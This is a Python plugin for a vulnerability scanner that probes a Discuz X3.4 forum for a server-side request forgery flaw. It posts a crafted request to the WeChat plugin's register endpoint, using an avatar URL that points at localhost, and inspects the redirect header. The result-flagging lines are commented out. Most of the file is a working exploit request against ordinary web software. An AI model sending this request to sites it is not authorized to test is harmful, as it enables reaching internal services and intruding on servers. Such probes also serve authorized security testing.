#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'
# https://zhuanlan.zhihu.com/p/51907363

def info(data):
    info = {
        "name": "discuz x3.4 ssrf",
        "info": "discuz x3.4 ssrf",
        "level": "high",
        "type": "ssrf",
    }
    return info

def prove(data):
    init(data,'web')
    if data['base_url']:
        url = data[
                  'base_url'] + "plugin.php?id=wechat:wechat&ac=wxregister&username=vov&avatar=http://localhost:9090/dz-weixin-plugin-ssrf&wxopenid=dont_be_evil"
        _data = 'imgcroppersubmit=1&formhash=f8472648'
        res = curl('post', url,data = _data)
        if res != None and "location".lower() in res.headers.keys() and 'http://localhost#@www.baidu.com' in res.headers['location']:
            pass # 直接请求，需联通dnslog
            # data['flag'] = 1
            # data['data'].append({"flag": url})
            # data['res'].append({"info": url, "key": "discuz x3.4 ssrf"})
    return data
